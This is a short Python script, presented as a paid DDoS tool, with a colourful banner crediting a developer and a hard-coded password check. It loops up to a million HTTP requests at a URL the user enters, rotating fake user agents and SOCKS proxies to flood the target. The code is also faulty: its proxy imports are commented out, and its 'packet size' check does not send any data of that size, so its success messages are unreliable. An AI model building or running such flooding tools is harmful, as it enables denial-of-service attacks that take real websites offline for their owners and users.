import requests
import time
import random
#import socks
#import socket
from fake_useragent import UserAgent
import os

def logo():
    return """
   \x1b[38;5;196m ██████ \033[33;1m██    ██ \033[38;5;46m██████  \033[34;1m███████ \x1b[38;5;196m██████  
   \x1b[38;5;196m██       \033[33;1m██  ██  \033[38;5;46m██   ██ \033[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m██        \033[33;1m████   \033[38;5;46m██████  \033[34;1m█████   \x1b[38;5;196m██████  
   \x1b[38;5;196m██         \033[33;1m██    \033[38;5;46m██   ██ \033[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m ██████    \033[33;1m██    \033[38;5;46m██████  \033[34;1m███████ \x1b[38;5;196m██   ██ 
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mDEVELOPER \033[1;91m :   \033[1;92mSHOHAG-KHAN
  \033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mFACEBOOK \033[1;91m  :   \033[1;92mCEO卝 CYBERツ࿐
  \033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mTOOL TYPE \033[1;91m :   \033[1;92mPaid
  \033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mTOOL    \033[1;91m   :   \033[1;92mDIstributed Denial Of service(Ddos)
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def clear_terminal():
    os.system("clear")

def ddos_attack(url, packet_size):
    ua = UserAgent()
    headers = {'User-Agent': ua.random}

    if packet_size > 2000000:
        raise ValueError("Packet size should not exceed 2 Megabytes.")

    folder = os.path.dirname(os.path.abspath(__file__))
    proxy_file = os.path.join(folder, 'proxies.txt')

    with open(proxy_file, 'r') as f:
        proxy_list = [line.strip().split(':') for line in f.readlines()]

    for i in range(1, 1000001):
        try:
            if proxy_list:
                proxy = random.choice(proxy_list)
                socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                socket.socket = socks.socksocket

            response = requests.get(url, headers=headers, stream=True, timeout=1)
            if response.status_code == 200:
                if 'Content-Length' in response.headers:
                    content_length = int(response.headers['Content-Length'])
                    if content_length > packet_size:
                        print(f"Attack attempt {i} - Successfully sent a packet of {packet_size} bytes to the website.")
                    else:
                        print(f"Attack attempt {i} - Failed to send a packet of {packet_size} bytes to the website. (Wrong Content-Length)")
                else:
                    print(f"Attack attempt {i} - Failed to send a packet of {packet_size} bytes to the website. (No Content-Length)")
            else:
                print(f"Attack attempt {i} - Failed to send a packet of {packet_size} bytes to the website. (Wrong Status Code)")

            time.sleep(random.uniform(0.1, 0.5))

        except Exception as e:
            print(f"Error in attack attempt {i}: {e}")
            if proxy_list:
                socks.set_default_proxy()
                socket.socket = socket.socket

            time.sleep(random.uniform(1, 2))

    print("Attacking to this website successful.")

def login_system():
    password = input("Enter your password: ")
    if password == "tc03":
        print("Access granted. The tool has started.")
        clear_terminal()
        print(logo())
    else:
        print("Access denied. Incorrect password.")

if __name__ == '__main__':
    print(logo())
    login_system()
    url = input("Please enter the URL to attack: ")
    packet_size = int(input("Please enter the packet size (max 2 Megabytes): "))
    ddos_attack(url, packet_size)
